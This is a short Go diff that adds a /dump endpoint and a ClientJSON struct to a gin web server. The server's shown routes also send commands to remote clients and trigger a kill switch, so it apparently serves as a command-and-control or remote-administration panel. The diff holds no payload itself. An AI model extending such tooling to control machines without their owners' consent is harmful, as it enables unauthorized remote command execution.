@@ -6,10 +6,16 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/spf13/viper"
 )
+
+type ClientJSON struct {
+	Date time.Time
+	List []ClientBasicInfo
+}
 
 var (
 	WebPort string = "8080"
@@ -32,7 +38,16 @@ func WebServer() {
 	r.GET("/command/:clientid", getCommands)
 	r.POST("/command/:clientid", execCMD)
 	r.POST("/kill/:clientid", sendKillswitch)
+	r.GET("/dump", dumpClients)
 	r.Run(":" + WebPort)
+}
+
+func dumpClients(c *gin.Context) {
+	jsonClients := ClientJSON{Date: time.Now()}
+	for _, v := range clientList {
+		jsonClients.List = append(jsonClients.List, v.ClientBasicInfo)
+	}
+	c.IndentedJSON(http.StatusOK, jsonClients)
 }
 
 func getRoot(c *gin.Context) {
